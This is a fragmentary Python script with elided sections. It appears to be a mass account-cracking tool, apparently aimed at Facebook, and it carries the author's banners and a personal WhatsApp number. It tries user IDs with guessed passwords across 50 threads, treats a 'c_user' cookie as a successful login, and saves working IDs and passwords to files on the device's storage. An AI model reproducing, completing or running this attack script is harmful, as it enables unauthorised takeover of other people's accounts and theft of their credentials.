...
#-*-coding:utf-8-*-
#!/usr/bin/python4
#FUCKED BY JAHID [JAHID-404-CYBER]
#JAHID TERA PAPPA []
#---------------------[IMPORT]---------------------#
from os import path
import os,base64,zlib,pip,urllib
print('\n\033[1;37m install modules....\n It will take some seconds...JAHID   W8 update Tool..')
...
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   : JAHID         │ 
\033[1;37m│ ❲★❳ GITHUB   : jahid-444             |
\033[1;37m│ ❲★❳ WHATSAPP : +8801865508461   │
...
def random_apk():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAHID-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAHID-RNDM-CP.txt  ")
...
def apk(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/JAHID-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
...
def mix(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JAHID-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
